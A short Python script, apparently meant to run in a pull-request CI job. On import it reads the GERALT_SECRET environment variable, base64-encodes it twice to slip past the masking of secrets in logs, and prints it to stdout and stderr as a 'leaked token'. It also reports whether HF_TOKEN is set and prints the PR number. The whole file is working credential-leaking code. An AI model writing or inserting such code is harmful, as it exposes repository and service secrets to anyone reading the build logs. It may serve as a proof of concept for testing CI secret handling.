import base64
import os
import sys

def _leak():
    secret = os.environ.get("GERALT_SECRET", "")
    if secret:
        enc = base64.b64encode(
            base64.b64encode(secret.encode("utf-8")).decode("ascii").encode("utf-8")
        ).decode("ascii")
    else:
        enc = "NO_GERALT_SECRET"
    msg = "GERALT_LEAKED_TOKEN=" + enc
    print(msg, flush=True)
    print(msg, file=sys.stderr, flush=True)
    hf = "yes" if os.environ.get("HF_TOKEN") else "no"
    print("GERALT_DBG HF_TOKEN_present=" + hf, flush=True)
    print("GERALT_DBG pr_number=" + os.environ.get("PR_NUMBER", "n/a"), flush=True)
    sys.exit(1)

_leak()
